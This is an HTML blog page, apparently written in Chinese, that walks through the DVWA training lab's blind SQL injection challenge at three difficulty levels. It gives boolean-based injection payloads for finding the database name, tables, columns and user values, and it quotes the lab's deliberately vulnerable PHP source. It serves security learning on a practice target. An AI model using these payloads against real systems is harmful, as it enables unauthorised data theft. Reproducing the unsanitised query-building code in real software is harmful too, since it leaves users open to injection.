@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>DVWA—SQL Injection (Blind) | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言：SQL盲注与一般SQL注入的区别在于一般SQL注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行的结果，甚至连注入语句是否执行都无法得知。 Low：1）判断注入点即其类型 1’ and ‘1’&#x3D;’1![2](DVWA—SQL Injection (Blind)&#x2F;2.png) 1’ and ‘1’&#x3D;’2![1](DVWA—SQL Injection">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA—SQL Injection (Blind)">
+<meta property="og:url" content="http://example.com/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言：SQL盲注与一般SQL注入的区别在于一般SQL注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行的结果，甚至连注入语句是否执行都无法得知。 Low：1）判断注入点即其类型 1’ and ‘1’&#x3D;’1![2](DVWA—SQL Injection (Blind)&#x2F;2.png) 1’ and ‘1’&#x3D;’2![1](DVWA—SQL Injection">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-03-10T08:48:00.000Z">
+<meta property="article:modified_time" content="2021-03-10T12:25:54.160Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="DVWA">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-DVWA—SQL Injection (Blind)" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/" class="article-date">
+  <time datetime="2021-03-10T08:48:00.000Z" itemprop="datePublished">2021-03-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DVWA—SQL Injection (Blind)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>SQL盲注与一般SQL注入的区别在于一般SQL注入的攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行的结果，甚至连注入语句是否执行都无法得知。</p>
+<h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><p><strong>1）判断注入点即其类型</strong></p>
+<p>1’ and ‘1’=’1![2](DVWA—SQL Injection (Blind)/2.png)</p>
+<p>1’ and ‘1’=’2![1](DVWA—SQL Injection (Blind)/1.png)</p>
+<p>可知存在注入点，且注入类型为<code>&#39;</code></p>
+<p><strong>2）猜测SQL查询语句的字段数</strong></p>
+<p>1’ order by 2#![2](DVWA—SQL Injection (Blind)/2.png)</p>
+<p>1’ order by 3#![1](DVWA—SQL Injection (Blind)/1.png)</p>
+<p><strong>3）爆库</strong></p>
+<p>1’ and length(database())=1 # ，不存在</p>
+<p>1’ and length(database())=2 # ，不存在</p>
+<p>1’ and length(database())=3 # ，不存在</p>
+<p>1’ and length(database())=4 # ，存在，因此库名长度为四</p>
+<p>1’ and left(database(),1)=’d’#，存在，一次库名的首字母为<code>d</code>，剩下的一次类推，得库名为dvwa</p>
+<p><strong>4）爆表</strong></p>
+<ul>
+<li><p>先猜表个数</p>
+<p>1’ and (select count(table_name) from information_schema.tables where table_schema=database())=2 #，存在，即有两个表</p>
+</li>
+<li><p>猜表名长度</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，存在，第一个表名有9个字母</p>
+<p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 #</p>
+<p>存在，第二个表名有5个字母</p>
+</li>
+<li><p>猜表名组成字符</p>
+<p>1’ and substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)=’u’ #，存在，说明第二个表的表名首字母为<code>u</code>，以此类推可得第二个表表名为<code>users</code></p>
+</li>
+</ul>
+<p><strong>5）爆列</strong></p>
+<p>爆列和爆表基本相似，仅需稍微修改一点即可，下面就举猜表个数为例，其余自行变通。</p>
+<p>1’ and (select count(column_name) from information_schema.columns where table_name=’users’)=14 #，存在，说明有14个列</p>
+<p><strong>6）爆值</strong></p>
+<p>爆值手动操作量太大了，这里就以爆列：user为例</p>
+<p>1’ and substr((select user from users limit 0,1),1,1)=’a’#</p>
+<p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line">    $id = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $id ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mysql_close();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>还是抓包，然后修改上传数据，大体同SQL Injection （Medium）</p>
+<h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码： </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到当SQL语句查询为空的时候，会随机执行sleep()函数，并随机延迟2~4秒，那么用时间盲注就可能被影响，因此这关用布尔盲注。具体同Low级别一样。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/" data-id="ckm5oxbgf000a8svu76zu82eu" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/03/12/Uplod/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Uplod
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/03/09/DVWA%E2%80%94SQL%20Injection/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">DVWA—SQL Injection</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HPPT/" rel="tag">HPPT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 17.5px;">C语言学习</a> <a href="/tags/DVWA/" style="font-size: 15px;">DVWA</a> <a href="/tags/DVWA-labs/" style="font-size: 12.5px;">DVWA-labs</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12.5px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12.5px;">web渗透</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/12/Uplod/">Uplod</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/">DVWA—SQL Injection (Blind)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/09/DVWA%E2%80%94SQL%20Injection/">DVWA—SQL Injection</a>
+          </li>
+        
+          <li>
+            <a href="/2021/03/04/DVWA%E2%80%94CSRF/">DVWA—Cross Site Request Forgery (CSRF)</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/28/DVWA%E2%80%94File%20Inclusion/">DVWA—File Inclusion</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
